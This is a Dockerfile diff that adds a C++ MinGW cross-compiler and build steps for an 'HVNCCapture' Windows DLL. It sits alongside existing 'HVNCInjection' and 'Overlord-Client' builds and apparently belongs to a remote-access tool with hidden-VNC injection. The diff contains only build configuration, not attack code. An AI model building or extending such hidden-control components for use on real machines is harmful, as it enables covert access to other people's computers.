@@ -8,6 +8,7 @@ RUN apt-get update \
     && apt-get install -y --no-install-recommends \
     build-essential \
     gcc-mingw-w64-x86-64 \
+    g++-mingw-w64-x86-64 \
     gcc-mingw-w64-i686 \
     musl-tools \
     gcc-aarch64-linux-gnu \
@@ -71,6 +72,10 @@ COPY Overlord-Client/ ./Overlord-Client/
 COPY HVNCInjection/ ./HVNCInjection/
 COPY build-hvnc-dll.sh ./build-hvnc-dll.sh
 
+# Copy HVNCCapture source and build script for cross-compilation
+COPY HVNCCapture/ ./HVNCCapture/
+COPY build-hvnc-capture-dll.sh ./build-hvnc-capture-dll.sh
+
 # Use MSVC-built HVNCInjection DLL if present (preferred, from CI artifact).
 # Fall back to cross-compiling with mingw only if no pre-built DLL exists.
 RUN if [ -f dist-clients/HVNCInjection.x64.dll ]; then \
@@ -79,6 +84,16 @@ RUN if [ -f dist-clients/HVNCInjection.x64.dll ]; then \
       chmod +x build-hvnc-dll.sh && \
       HVNC_SRC_DIR=HVNCInjection/src HVNC_OUT_DIR=dist-clients bash build-hvnc-dll.sh || \
       echo "WARNING: HVNCInjection DLL not available (build with MSVC on Windows)"; \
+    fi
+
+# Use MSVC-built HVNCCapture DLL if present (preferred, from CI artifact).
+# Fall back to cross-compiling with mingw (C++) only if no pre-built DLL exists.
+RUN if [ -f dist-clients/HVNCCapture.x64.dll ]; then \
+      echo "Using pre-built MSVC HVNCCapture DLL"; \
+    else \
+      chmod +x build-hvnc-capture-dll.sh && \
+      HVNC_CAPTURE_SRC_DIR=HVNCCapture/src HVNC_CAPTURE_OUT_DIR=dist-clients bash build-hvnc-capture-dll.sh || \
+      echo "WARNING: HVNCCapture DLL not available (build with MSVC on Windows)"; \
     fi
 
 # Create necessary directories
